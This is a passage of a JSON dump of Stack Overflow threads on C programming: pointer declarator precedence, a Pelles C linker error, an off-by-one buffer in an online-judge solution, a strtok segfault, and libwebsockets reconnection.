around)\n^^^^^^                 pointers to char.\n</code></pre>\n\n<p>Which indeed is quite different.</p>\n"}, {"tags": [], "owner": {"reputation": 100407, "user_id": 16406, "user_type": "registered", "accept_rate": 77, "profile_image": "https://www.gravatar.com/avatar/fadf252892475e9b177d5cd5e8b24145?s=128&d=identicon&r=PG&f=1", "display_name": "Chris Dodd", "link": "https://stackoverflow.com/users/16406/chris-dodd"}, "is_accepted": false, "score": 0, "last_activity_date": 1483217587, "creation_date": 1483217587, "answer_id": 41411648, "question_id": 41361814, "link": "https://stackoverflow.com/questions/41361814/hard-time-understanding-precedence-principle-of-char-psizeofc/41411648#41411648", "title": "Hard time understanding precedence principle of char (*p)[sizeof(c)];", "body": "<p>The precedence principle is simple -- postfix operators are higher precedence than prefix.  <code>*</code> is a prefix operation and <code>[sizeof(c)]</code> is postfix, so when you say:</p>\n\n<pre><code>char *p[sizeof(c)];\n</code></pre>\n\n<p>that's the same as</p>\n\n<pre><code>char *(p[sizeof(c)]);\n</code></pre>\n\n<p>the higher precedence operator binds first to the operand (the declarator name <code>p</code> here).</p>\n"}], "owner": {"reputation": 374, "user_id": 4179642, "user_type": "registered", "accept_rate": 61, "profile_image": "https://www.gravatar.com/avatar/9f75a77b3e5fd92911c48b01c471ab81?s=128&d=identicon&r=PG&f=1", "display_name": "Pipsqweek", "link": "https://stackoverflow.com/users/4179642/pipsqweek"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 270, "favorite_count": 2, "accepted_answer_id": 41362000, "answer_count": 4, "score": 7, "last_activity_date": 1483217587, "creation_date": 1482926813, "last_edit_date": 1483216060, "question_id": 41361814, "link": "https://stackoverflow.com/questions/41361814/hard-time-understanding-precedence-principle-of-char-psizeofc", "title": "Hard time understanding precedence principle of char (*p)[sizeof(c)];", "body": "<p>I'm learning pointers and to challenge myself I tried dereferencing a pointer to a character array. Eventually this worked:</p>\n\n<pre><code>char (*p)[sizeof(c)];\n</code></pre>\n\n<p>Where c is an array c[]=\"something\"</p>\n\n<p>I'm having a hard time understanding how <code>(*p)[sizeof(c)];</code> differs from <code>*p[sizeof(c)];</code></p>\n\n<p>Based on what I know presently (which is not much!) the computer is saying this in the case of <code>(*p)[sizeof(c)];</code>:</p>\n\n<p><em>\"p points to c! oh, and btw, p is an array of whatever sizeof(c) ends up being\"</em>. </p>\n\n<p>But even that seems strange to me, so I guess I am confused as to what is being constructed when the parenthesis are added. </p>\n\n<p>Can someone explain? </p>\n\n<p>Full code in context here:</p>\n\n<pre><code>#include &lt;iostream&gt;\n\nusing namespace std;\n\nint main(int argc, char *argv[]) {\n\n    char c[] = \"something\";\n\n    char (*p)[sizeof(c)]; // this works\n    // char *p[sizeof(c)]; // this doesn't?\n\n    p = &amp;c;\n\n    cout &lt;&lt; p &lt;&lt; endl;  \n\n    cout &lt;&lt; *p &lt;&lt; endl;\n}\n</code></pre>\n"}, {"tags": ["c", "winapi", "pelles-c"], "answers": [{"comments": [{"owner": {"reputation": 570607, "user_id": 505088, "user_type": "registered", "accept_rate": 91, "profile_image": "https://www.gravatar.com/avatar/3c0aac2191718ef0309dbc034d9b9961?s=128&d=identicon&r=PG", "display_name": "David Heffernan", "link": "https://stackoverflow.com/users/505088/david-heffernan"}, "edited": false, "score": 0, "creation_date": 1482927185, "post_id": 41361785, "comment_id": 69924909, "body": "This has been asked so many times before. I do t this k we need yet another version of this."}, {"owner": {"reputation": 5189, "user_id": 5223757, "user_type": "registered", "accept_rate": 78, "profile_image": "https://i.stack.imgur.com/FdOvO.png?s=128&g=1", "display_name": "wizzwizz4", "link": "https://stackoverflow.com/users/5223757/wizzwizz4"}, "reply_to_user": {"reputation": 570607, "user_id": 505088, "user_type": "registered", "accept_rate": 91, "profile_image": "https://www.gravatar.com/avatar/3c0aac2191718ef0309dbc034d9b9961?s=128&d=identicon&r=PG", "display_name": "David Heffernan", "link": "https://stackoverflow.com/users/505088/david-heffernan"}, "edited": false, "score": 0, "creation_date": 1482928555, "post_id": 41361785, "comment_id": 69925680, "body": "@DavidHeffernan Thanks for marking as duplicate. I only asked this question because nothing was coming up in search results; now people who have my problem will be directed to the &quot;original&quot; question."}, {"owner": {"reputation": 570607, "user_id": 505088, "user_type": "registered", "accept_rate": 91, "profile_image": "https://www.gravatar.com/avatar/3c0aac2191718ef0309dbc034d9b9961?s=128&d=identicon&r=PG", "display_name": "David Heffernan", "link": "https://stackoverflow.com/users/505088/david-heffernan"}, "edited": false, "score": 0, "creation_date": 1482928854, "post_id": 41361785, "comment_id": 69925846, "body": "Somewhat hard to fathom. A search for your error message yields multiple results."}, {"owner": {"reputation": 5189, "user_id": 5223757, "user_type": "registered", "accept_rate": 78, "profile_image": "https://i.stack.imgur.com/FdOvO.png?s=128&g=1", "display_name": "wizzwizz4", "link": "https://stackoverflow.com/users/5223757/wizzwizz4"}, "reply_to_user": {"reputation": 570607, "user_id": 505088, "user_type": "registered", "accept_rate": 91, "profile_image": "https://www.gravatar.com/avatar/3c0aac2191718ef0309dbc034d9b9961?s=128&d=identicon&r=PG", "display_name": "David Heffernan", "link": "https://stackoverflow.com/users/505088/david-heffernan"}, "edited": false, "score": 0, "creation_date": 1482929187, "post_id": 41361785, "comment_id": 69926017, "body": "@DavidHeffernan None of them answered the question; at least none that I found. I worked the answer out myself (which wasn&#39;t too hard now that I know what a linker is) and posted this, after searching for duplicates (although probably not with the right keywords)."}, {"owner": {"reputation": 35031, "user_id": 1889329, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/57bec3f0b9c5879cdd9d9fa2e8629318?s=128&d=identicon&r=PG&f=1", "display_name": "IInspectable", "link": "https://stackoverflow.com/users/1889329/iinspectable"}, "edited": false, "score": 0, "creation_date": 1482931290, "post_id": 41361785, "comment_id": 69927153, "body": "<a href=\"http://stackoverflow.com/a/12574400/1889329\">This post</a> addresses your specific issue, and provides an answer."}], "tags": [], "owner": {"reputation": 5189, "user_id": 5223757, "user_type": "registered", "accept_rate": 78, "profile_image": "https://i.stack.imgur.com/FdOvO.png?s=128&g=1", "display_name": "wizzwizz4", "link": "https://stackoverflow.com/users/5223757/wizzwizz4"}, "is_accepted": false, "score": 0, "last_activity_date": 1482926712, "creation_date": 1482926712, "answer_id": 41361785, "question_id": 41361784, "link": "https://stackoverflow.com/questions/41361784/windows-h-functions-trigger-polink-error-in-pelles-c/41361785#41361785", "title": "&lt;windows.h&gt; Functions Trigger POLINK Error in Pelles C", "body": "<p>The problem here is with the linker. This suggests that the program needs to be linked to a library that it is not being linked to. The <a href=\"//msdn.microsoft.com/en-us/library/windows/desktop/ms646299(v=vs.85).aspx\" rel=\"nofollow noreferrer\">documentation page for this function</a> says that the required library is <code>User32.lib</code>.</p>\n\n<p>To link to the library, click \"Project\" -> \"Project options...\", then select the \"Linker\" tab. There will probably be libraries in the \"Library and object files:\" box; add <code>User32.lib</code> (case insensitive) to this space-separated list.</p>\n\n<p>Your program should now compile.</p>\n"}], "owner": {"reputation": 5189, "user_id": 5223757, "user_type": "registered", "accept_rate": 78, "profile_image": "https://i.stack.imgur.com/FdOvO.png?s=128&g=1", "display_name": "wizzwizz4", "link": "https://stackoverflow.com/users/5223757/wizzwizz4"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 293, "favorite_count": 0, "closed_date": 1482927145, "answer_count": 1, "score": -1, "last_activity_date": 1482926712, "creation_date": 1482926712, "question_id": 41361784, "link": "https://stackoverflow.com/questions/41361784/windows-h-functions-trigger-polink-error-in-pelles-c", "closed_reason": "Duplicate", "title": "&lt;windows.h&gt; Functions Trigger POLINK Error in Pelles C", "body": "<p>I have a simple program (<code>program.c</code>) that I am compiling with Pelles C:</p>\n\n<pre><code>#include &lt;windows.h&gt;\nvoid main() {\n    char buffer[256];\n    GetKeyboardState(buffer);\n}\n</code></pre>\n\n<p>When I try to compile this program, <a href=\"//stackoverflow.com/a/5462901/5223757\">after enabling Microsoft Extensions</a>, it fails:</p>\n\n<blockquote>\n  <p>Building program.obj.<br>\n  Building program.exe.<br>\n  <strong>POLINK: error: Unresolved external symbol '__imp_GetKeyboardState'.</strong><br>\n  <strong>POLINK: fatal error: 1 unresolved external(s).</strong><br>\n  *** Error code: 1 ***<br>\n  Done.</p>\n</blockquote>\n\n<p>How can I make this work?</p>\n"}, {"tags": ["c", "runtime"], "comments": [{"owner": {"reputation": 23946, "user_id": 3100312, "user_type": "registered", "accept_rate": 55, "profile_image": "https://www.gravatar.com/avatar/486be6e961e6c8a2e4705058600e666f?s=128&d=identicon&r=PG&f=1", "display_name": "Paul Ogilvie", "link": "https://stackoverflow.com/users/3100312/paul-ogilvie"}, "edited": false, "score": 0, "creation_date": 1482925317, "post_id": 41361195, "comment_id": 69923797, "body": "I have seen this before with their compiler/test bed: your <code>void main()</code> is a pertinent wrong declaration and must be <code>int main</code>. As a result, your <code>main</code> returns an undefined value, which their test bed interprets as an error and so reports a run-time error. Have it return 0."}, {"owner": {"reputation": 3928, "user_id": 7347631, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/905cba2c96dba01877d265382fd921a9?s=128&d=identicon&r=PG&f=1", "display_name": "Andrew Naguib", "link": "https://stackoverflow.com/users/7347631/andrew-naguib"}, "reply_to_user": {"reputation": 23946, "user_id": 3100312, "user_type": "registered", "accept_rate": 55, "profile_image": "https://www.gravatar.com/avatar/486be6e961e6c8a2e4705058600e666f?s=128&d=identicon&r=PG&f=1", "display_name": "Paul Ogilvie", "link": "https://stackoverflow.com/users/3100312/paul-ogilvie"}, "edited": false, "score": 0, "creation_date": 1482925544, "post_id": 41361195, "comment_id": 69923921, "body": "Yeah thanks i did that, but now it says wrong answer for some reason although it works very well on the IDE and it&#39;s bad that their compiler doesn&#39;t say which test case made the code fails"}], "answers": [{"comments": [{"owner": {"reputation": 3928, "user_id": 7347631, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/905cba2c96dba01877d265382fd921a9?s=128&d=identicon&r=PG&f=1", "display_name": "Andrew Naguib", "link": "https://stackoverflow.com/users/7347631/andrew-naguib"}, "edited": false, "score": 0, "creation_date": 1482925937, "post_id": 41361404, "comment_id": 69924157, "body": "i didn&#39;t really understand what you mean by &quot; You forgot to include the terminating &#39;\\0&#39; &quot;"}, {"owner": {"reputation": 7421, "user_id": 6782754, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/99008d0e4c4c15ab03d77938ad9e345b?s=128&d=identicon&r=PG", "display_name": "Gerhardh", "link": "https://stackoverflow.com/users/6782754/gerhardh"}, "reply_to_user": {"reputation": 3928, "user_id": 7347631, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/905cba2c96dba01877d265382fd921a9?s=128&d=identicon&r=PG&f=1", "display_name": "Andrew Naguib", "link": "https://stackoverflow.com/users/7347631/andrew-naguib"}, "edited": false, "score": 0, "creation_date": 1482926305, "post_id": 41361404, "comment_id": 69924380, "body": "You might want to read the basics of strings in C again. A string like <code>&quot;Hello&quot;</code> takes 6 bytes of memory as all strings are zero-terminated, i.e. they have a trailing <code>\\0</code>-byte at the end. If the test case enters a string with exactly 100 letters you will need 101 bytes where <code>scanf</code> can store the result. You only provide 100 bytes."}, {"owner": {"reputation": 3928, "user_id": 7347631, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/905cba2c96dba01877d265382fd921a9?s=128&d=identicon&r=PG&f=1", "display_name": "Andrew Naguib", "link": "https://stackoverflow.com/users/7347631/andrew-naguib"}, "edited": false, "score": 0, "creation_date": 1482926394, "post_id": 41361404, "comment_id": 69924424, "body": "Yeah gotcha, i just needed to know what exactly i need to change"}], "tags": [], "owner": {"reputation": 7421, "user_id": 6782754, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/99008d0e4c4c15ab03d77938ad9e345b?s=128&d=identicon&r=PG", "display_name": "Gerhardh", "link": "https://stackoverflow.com/users/6782754/gerhardh"}, "is_accepted": true, "score": 0, "last_activity_date": 1482925425, "creation_date": 1482925425, "answer_id": 41361404, "question_id": 41361195, "link": "https://stackoverflow.com/questions/41361195/runtime-error-c-programming-no-error-on-ide/41361404#41361404", "title": "Runtime Error - C Programming , No Error on IDE", "body": "<p>You cannot store an input string with up to 100 letters in your buffer:</p>\n\n<pre><code>char caseInput[100];\n</code></pre>\n\n<p>You forgot to include the terminating <code>'\\0'</code></p>\n\n<p>Not related to runtime error but probably still unintentionally:</p>\n\n<pre><code>max = -1;\nchar result = NULL;\nmemset(count,0,sizeof(count));\n</code></pre>\n\n<p>Here you define a second <code>result</code> hiding the previous definition.</p>\n\n<p>Also probably not related to your problem:</p>\n\n<pre><code>void main()\n</code></pre>\n\n<p>is not correct. Make it</p>\n\n<pre><code>int main(void) \n</code></pre>\n\n<p>or</p>\n\n<pre><code>int main (int argv, char *argc[])\n</code></pre>\n\n<p>and return 0 on success.</p>\n"}], "owner": {"reputation": 3928, "user_id": 7347631, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/905cba2c96dba01877d265382fd921a9?s=128&d=identicon&r=PG&f=1", "display_name": "Andrew Naguib", "link": "https://stackoverflow.com/users/7347631/andrew-naguib"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 147, "favorite_count": 0, "accepted_answer_id": 41361404, "answer_count": 1, "score": 1, "last_activity_date": 1482925425, "creation_date": 1482924697, "question_id": 41361195, "link": "https://stackoverflow.com/questions/41361195/runtime-error-c-programming-no-error-on-ide", "title": "Runtime Error - C Programming , No Error on IDE", "body": "<p>Here's the description of the problem <a href=\"https://a2oj.com/p?ID=193\" rel=\"nofollow noreferrer\">https://a2oj.com/p?ID=193</a> , it works very well on Visual Studio but for some reason it produces Runtime - Error on the website's online judge compiler, it's hard for me to detect it since their compiler doesn't tell what was the test case produced the error.</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;\n#define ASCII_SIZE 255\nvoid main(){\n   int testCases;\n   char caseInput[100];\n   int count[ASCII_SIZE] = {0};\n   int strLength;\n   int max = -1;\n   char result = NULL; \n    typedef struct occurrence{\n        int numOfOcc;\n        char occLetter; }Occurence;\n    scanf(\"%d\",&amp;testCases);\n    Occurence *ptr;\n    ptr = (Occurence*)malloc(testCases * sizeof(Occurence));\n    if (ptr){\n    for (int caseValue = 0; caseValue &lt; testCases; caseValue++)\n        {\n         scanf(\"%s\",caseInput);\n         strLength = strlen(caseInput);\n         for (int i=0; i&lt;strLength; i++)\n             count[caseInput[i]]++;\n         for (int i = 0; i &lt; strLength; i++) {\n             if (max &lt;= count[caseInput[i]]) {\n                 if (result &gt; caseInput[i] &amp;&amp; i &gt; 0 ){\n                 max = count[caseInput[i]];\n                 result = caseInput[i];\n                     }\n                 else if ( i == 0 ){\n                      max = count[caseInput[i]];\n                      result = caseInput[i];\n                     }\n\n                 }\n             }\n         ptr[caseValue].numOfOcc = max;\n         ptr[caseValue].occLetter = result;\n         max = -1;\n         char result = NULL;\n         memset(count,0,sizeof(count));\n        }\n    for (int i = 0; i &lt; testCases; i++)\n        {\n        printf(\"%d %c\\n\",ptr[i].numOfOcc,ptr[i].occLetter);\n        }\n        }\n   }\n</code></pre>\n"}, {"tags": ["c", "if-statement", "segmentation-fault", "operator-keyword", "relational"], "comments": [{"owner": {"reputation": 4186, "user_id": 2773311, "user_type": "registered", "accept_rate": 73, "profile_image": "https://i.stack.imgur.com/wIGqo.png?s=128&g=1", "display_name": "Arc676", "link": "https://stackoverflow.com/users/2773311/arc676"}, "edited": false, "score": 1, "creation_date": 1482924232, "post_id": 41361042, "comment_id": 69923225, "body": "Where is <code>parente</code> declared in this code snippet?"}, {"owner": {"reputation": 7421, "user_id": 6782754, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/99008d0e4c4c15ab03d77938ad9e345b?s=128&d=identicon&r=PG", "display_name": "Gerhardh", "link": "https://stackoverflow.com/users/6782754/gerhardh"}, "edited": false, "score": 2, "creation_date": 1482924356, "post_id": 41361042, "comment_id": 69923272, "body": "Where are <code>name_a</code> and <code>parente</code> defined? What do you pass as <code>str1</code> If it is a string literal or other const memory, <code>strtok()</code> will cause trouble when it tries to write <code>\\&#39;0&#39;</code> into the string."}, {"owner": {"reputation": 7421, "user_id": 6782754, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/99008d0e4c4c15ab03d77938ad9e345b?s=128&d=identicon&r=PG", "display_name": "Gerhardh", "link": "https://stackoverflow.com/users/6782754/gerhardh"}, "edited": false, "score": 0, "creation_date": 1482924862, "post_id": 41361042, "comment_id": 69923521, "body": "Are you sure that you even reach your <code>if</code> statement? Did you run it in debugger?"}, {"owner": {"reputation": 177, "user_id": 7349461, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-A2bOQYS02Nc/AAAAAAAAAAI/AAAAAAAAACc/YL9cxA7UJpg/photo.jpg?sz=128", "display_name": "user7349461", "link": "https://stackoverflow.com/users/7349461/user7349461"}, "edited": false, "score": 0, "creation_date": 1482927399, "post_id": 41361042, "comment_id": 69925026, "body": "I put a printf right infront of the first if, and it was printed. and I only get a segmentation fault if one of the conditions would be false"}, {"owner": {"reputation": 177, "user_id": 7349461, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-A2bOQYS02Nc/AAAAAAAAAAI/AAAAAAAAACc/YL9cxA7UJpg/photo.jpg?sz=128", "display_name": "user7349461", "link": "https://stackoverflow.com/users/7349461/user7349461"}, "reply_to_user": {"reputation": 7421, "user_id": 6782754, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/99008d0e4c4c15ab03d77938ad9e345b?s=128&d=identicon&r=PG", "display_name": "Gerhardh", "link": "https://stackoverflow.com/users/6782754/gerhardh"}, "edited": false, "score": 1, "creation_date": 1482927652, "post_id": 41361042, "comment_id": 69925194, "body": "@Gerhardh Str1 is allocated in dynamic memory."}, {"owner": {"reputation": 7421, "user_id": 6782754, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/99008d0e4c4c15ab03d77938ad9e345b?s=128&d=identicon&r=PG", "display_name": "Gerhardh", "link": "https://stackoverflow.com/users/6782754/gerhardh"}, "edited": false, "score": 1, "creation_date": 1482927669, "post_id": 41361042, "comment_id": 69925206, "body": "Why don&#39;t you provide the code that you <i>really</i> run? As you obviously created something different for SO, you might easily missed the important parts. BTW: You use token without any check for <code>NULL</code>."}, {"owner": {"reputation": 177, "user_id": 7349461, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-A2bOQYS02Nc/AAAAAAAAAAI/AAAAAAAAACc/YL9cxA7UJpg/photo.jpg?sz=128", "display_name": "user7349461", "link": "https://stackoverflow.com/users/7349461/user7349461"}, "edited": false, "score": 0, "creation_date": 1482928918, "post_id": 41361042, "comment_id": 69925880, "body": "Yes if&#39;ve missed that too thanks :)."}, {"owner": {"reputation": 177, "user_id": 7349461, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-A2bOQYS02Nc/AAAAAAAAAAI/AAAAAAAAACc/YL9cxA7UJpg/photo.jpg?sz=128", "display_name": "user7349461", "link": "https://stackoverflow.com/users/7349461/user7349461"}, "reply_to_user": {"reputation": 7421, "user_id": 6782754, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/99008d0e4c4c15ab03d77938ad9e345b?s=128&d=identicon&r=PG", "display_name": "Gerhardh", "link": "https://stackoverflow.com/users/6782754/gerhardh"}, "edited": false, "score": 0, "creation_date": 1482929110, "post_id": 41361042, "comment_id": 69925983, "body": "@Gerhardh And i&#39;ve just tried to just put a 0 or 1 as a condition. And just using a 0 as a statement resulted in a segmentation fault too. So I&#39;m a bit clueless. Its a larger program, and this is just a small piece, but i&#39;ve only changed the variable names"}, {"owner": {"reputation": 7421, "user_id": 6782754, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/99008d0e4c4c15ab03d77938ad9e345b?s=128&d=identicon&r=PG", "display_name": "Gerhardh", "link": "https://stackoverflow.com/users/6782754/gerhardh"}, "edited": false, "score": 0, "creation_date": 1482948365, "post_id": 41361042, "comment_id": 69936277, "body": "In the if condition only automatic variables are evaluated. How should this ever cause a seg fault? Please show us the code that calls your function."}], "answers": [{"comments": [{"owner": {"reputation": 27385, "user_id": 1382251, "user_type": "registered", "accept_rate": 68, "profile_image": "https://www.gravatar.com/avatar/17622c39e8ead537a0944c767551b2fe?s=128&d=identicon&r=PG", "display_name": "barak manos", "link": "https://stackoverflow.com/users/1382251/barak-manos"}, "edited": false, "score": 1, "creation_date": 1482944571, "post_id": 41365721, "comment_id": 69934477, "body": "The statement &quot;Function <code>strtok</code> will crash if you don&#39;t use <code>char[]</code>&quot; is generally misleading, and not necessarily correct. Function <code>strtok</code> takes a pointer to a <b>non-constant</b> null-terminated array of characters. So for example, if you declare <code>const char str[5]</code>, you will get a segmentation fault (or more generally, undefined behavior) when calling <code>strtok(str,...)</code>. Since a string literal is constant by definition, this too cannot be passed as the first input argument of function <code>strtok</code>."}, {"owner": {"reputation": 7421, "user_id": 6782754, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/99008d0e4c4c15ab03d77938ad9e345b?s=128&d=identicon&r=PG", "display_name": "Gerhardh", "link": "https://stackoverflow.com/users/6782754/gerhardh"}, "edited": false, "score": 1, "creation_date": 1482948315, "post_id": 41365721, "comment_id": 69936255, "body": "If a pointer is passed to <code>strtok</code> that points to memory from a dynamic allocation then we can assume that we do not have a problem with const memory."}], "tags": [], "owner": {"reputation": 22041, "user_id": 108207, "user_type": "registered", "accept_rate": 96, "profile_image": "https://www.gravatar.com/avatar/dd8608b8b423bdcbda3fe5c0cf8b6230?s=128&d=identicon&r=PG&f=1", "display_name": "Niklas R.", "link": "https://stackoverflow.com/users/108207/niklas-r"}, "is_accepted": false, "score": 0, "last_activity_date": 1482941295, "creation_date": 1482941295, "answer_id": 41365721, "question_id": 41361042, "link": "https://stackoverflow.com/questions/41361042/segmentation-fault-using-relational-operators-in-if-condidtion/41365721#41365721", "title": "Segmentation fault using relational operators in if condidtion", "body": "<p>The <code>strtok</code> will crash if you don't use <code>char[]</code>. You can get around it using <code>strcpy</code>.</p>\n\n<pre><code>char str[80];\nstrcpy(str, str1);\nchar *token = strtok(str, \"\\\"\");\n</code></pre>\n\n<p>I'm not sure what you're trying to do, but your code will run without crashing after the small change. </p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\nint foo(char *str1,char **str2, char **str3)\n{\n    char *token1;\n    char *token2;\n\n    char str[80];\n    strcpy(str, str1);\n    char *token = strtok(str, \"\\\"\");\n    int spaces = strcmp(token,\"  \");\n    int parenthesis = strcmp(\"{\",token);\n    if((token == NULL) || ((spaces != 0) &amp;&amp; (parenthesis != 0)))\n    {\n        printf(\"ERR.\\n\");\n        return 0;\n    }\n    token = strtok(NULL, \"\\\"\");\n    if(token == NULL)\n    {\n        printf(\"2ERR\\n\");\n        return 0;\n    }\n    token1= strtok(NULL, \"\\\"\");\n    if(token1 == NULL || strcmp(token1,\" -&gt; \") != 0)\n    {\n        printf(\"3ERR\\n\");\n        return 0;\n    }\n    token2 = strtok(NULL, \"\\\"\");\n    return 1;\n}\nint main() {\n\n    char * c1, * c2, * c3;\n    c1 = \"foobaz\";\n    c2 = \"bar\";\n    c3 = \"baz\";\n\n    int i =  foo(c1, &amp;c2, &amp;c3);\n    return 0;\n}\n</code></pre>\n"}], "owner": {"reputation": 177, "user_id": 7349461, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-A2bOQYS02Nc/AAAAAAAAAAI/AAAAAAAAACc/YL9cxA7UJpg/photo.jpg?sz=128", "display_name": "user7349461", "link": "https://stackoverflow.com/users/7349461/user7349461"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 92, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1482941295, "creation_date": 1482924155, "last_edit_date": 1482926996, "question_id": 41361042, "link": "https://stackoverflow.com/questions/41361042/segmentation-fault-using-relational-operators-in-if-condidtion", "title": "Segmentation fault using relational operators in if condidtion", "body": "<p>The first if condition leads to a segmentation fault. I can't really comprehend why, since I use similar if clauses with relational operators elsewhere. Thanks for your help in advance.</p>\n\n<pre><code>int foo(char *str1,char **str2, char **str3)\n{\n  char *token1;\n  char *token2;\n  char *token = strtok(str1, \"\\\"\");\n  int spaces = strcmp(token,\"  \");\n  int parenthesis = strcmp(\"{\",token);\n  if((token == NULL) || ((spaces != 0) &amp;&amp; (parenthesis != 0))) \n  {\n    printf(\"ERR.\\n\");\n    return 0;\n  } \n  token = strtok(NULL, \"\\\"\");\n  if(token == NULL)\n  {  \n    printf(\"2ERR\\n\");\n    return 0;\n  }\n  token1= strtok(NULL, \"\\\"\");\n  if(token1 == NULL || strcmp(token1,\" -&gt; \") != 0)\n  {\n    printf(\"3ERR\\n\");\n    return 0;\n  }\n  token2 = strtok(NULL, \"\\\"\");\n  return 1;\n  }\n</code></pre>\n"}, {"tags": ["c", "multithreading", "server", "client", "libwebsockets"], "comments": [{"owner": {"reputation": 7421, "user_id": 6782754, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/99008d0e4c4c15ab03d77938ad9e345b?s=128&d=identicon&r=PG", "display_name": "Gerhardh", "link": "https://stackoverflow.com/users/6782754/gerhardh"}, "edited": false, "score": 1, "creation_date": 1482922587, "post_id": 41360515, "comment_id": 69922361, "body": "Please do not post code as screenshot. Add it as code block into your text. Throwing pictures at readers is a good way to prevent them from looking at your question."}, {"owner": {"reputation": 716, "user_id": 2881685, "user_type": "registered", "accept_rate": 86, "profile_image": "https://graph.facebook.com/100004845400077/picture?type=large", "display_name": "Hakeem El Bakka-lee", "link": "https://stackoverflow.com/users/2881685/hakeem-el-bakka-lee"}, "reply_to_user": {"reputation": 7421, "user_id": 6782754, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/99008d0e4c4c15ab03d77938ad9e345b?s=128&d=identicon&r=PG", "display_name": "Gerhardh", "link": "https://stackoverflow.com/users/6782754/gerhardh"}, "edited": false, "score": 0, "creation_date": 1482922633, "post_id": 41360515, "comment_id": 69922381, "body": "Okay, i ll correct this right now, thanks for advice :)"}], "owner": {"reputation": 716, "user_id": 2881685, "user_type": "registered", "accept_rate": 86, "profile_image": "https://graph.facebook.com/100004845400077/picture?type=large", "display_name": "Hakeem El Bakka-lee", "link": "https://stackoverflow.com/users/2881685/hakeem-el-bakka-lee"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 439, "favorite_count": 0, "answer_count": 0, "score": 0, "last_activity_date": 1482927349, "creation_date": 1482922502, "last_edit_date": 1482927349, "question_id": 41360515, "link": "https://stackoverflow.com/questions/41360515/libwesocket-client-server-all-in-one", "title": "Libwesocket Client + Server all in one", "body": "<p>I'am curently building a C Tasker, the goal of the program is to connect to a Main Server via Websockets and keep the connection Alive(Client Watchdog) as long as it is possible. </p>\n\n<p>In the mean time the Tasker should be able to receive Jsons from clients (Server Behaviour), process them accordingly and answer. </p>\n\n<p>To perfom this i use GLib's multi threading methods and the Libwebsockets library for the network part.  </p>\n\n<p>The C Client/Server Tasker is working well so the next step should be : when the connection is lost with the Main Server to try to reconnect \"forever\" until the Main Server is up, or to Fallback on another Main Server. </p>\n\n<p>The problem here is that when i cut the connection with the server the watchdog thread seems to ignore the reconnection. As the thread is completely isolated from the libwesockets callbacks. </p>\n\n<p>Here are the code snippets :          </p>\n\n<p>Call of Tasker Client in Tasker Server init                  </p>\n\n<pre><code>       int janus_websockets_init(janus_transport_callbacks *callback, const char *config_path) {            \n  if(g_atomic_int_get(&amp;stopping)) {                                                                  \n\n    return -1;                                                                                       \n  }                                                                                                  \n  if(callback == NULL || config_path == NULL)                                                        \n    return -1;                                                                                       \n        gateway = callback;                                                                          \n\n        Client_start() \n</code></pre>\n\n<p>Tasker Server configuration</p>\n\n<pre><code> struct lws_context_creation_info info;                                       \n                        memset(&amp;info, 0, sizeof info);                                               \n                        info.port = wsport;                                                          \n                        info.iface = ip ? ip : interface;                                            \n                        info.protocols = wss_protocols;                                              \n                        info.extensions = NULL;                                                      \n                        info.ssl_cert_filepath = NULL;                                               \n                        info.ssl_private_key_filepath = NULL;                                        \n                        info.gid = -1;                                                               \n                        info.uid = -1;                                                               \n                        info.options = 0;                                                            \n                        /* Create the WebSocket context */                                           \n                        wss = lws_create_context(&amp;info);                                             \n                        if(wss == NULL) {                                                            \n                                ZETA_LOG(LOG_FATAL, \"Error initializing libwebsockets...\\n\");        \n                        } else {                                                                     \n                                ZETA_LOG(LOG_INFO, \"WebSockets server started (port %d)...\\n\", wspor\\\nt);                                                                                                  \n                        }  \n</code></pre>\n\n<p>Tasker Client Configuration</p>\n\n<p>int </p>\n\n<pre><code>Client_start()                                                                                   \n{                                                                                                    \n  //* register the signal SIGINT handler */                                                          \n\n  struct lws_context_creation_info info;                                                             \n\n  memset(&amp;info, 0, sizeof info);                                                                     \n  info.port = CONTEXT_PORT_NO_LISTEN;                                                                \n  info.iface = NULL;                                                                                 \n  info.protocols = wss_protocols;                                                                    \n  info.ssl_cert_filepath = NULL;                                                                     \n  info.ssl_private_key_filepath = NULL;                                                              \n  info.extensions = lws_get_internal_extensions();                                                   \n  info.gid = -1;                                                                                     \n  info.uid = -1;                                                                                     \n  info.options = 0;                                                                                  \n\n  protocol.name  = \"janus-protocol\";                                                                 \n  protocol.callback = &amp;ws_client_service_callback;                                                   \n  protocol.per_session_data_size = sizeof(struct session_data);                                      \n  